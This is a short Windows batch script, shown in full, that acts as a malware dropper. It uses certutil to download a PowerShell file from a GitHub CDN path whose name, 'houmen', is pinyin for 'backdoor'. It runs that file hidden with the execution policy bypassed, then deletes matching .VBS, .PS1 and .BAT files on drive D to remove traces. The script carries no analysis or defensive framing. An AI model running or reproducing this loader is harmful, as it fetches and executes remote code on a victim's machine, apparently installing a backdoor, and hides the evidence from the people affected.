@echo off
certutil -urlcache -split -f https://cdn.jsdelivr.net/gh/Jacky-lei1/PicGO/houmen/final.ps1 d:\\final.ps1
TIMEOUT /T 1
start /B powershell.exe -executionpolicy bypass -file d:\\final.ps1
del D:\f*.VBS /f /s /q
TIMEOUT /T 1
del D:\f*.PS1 /f /s /q
del D:\f*.BAT /f /s /q
exit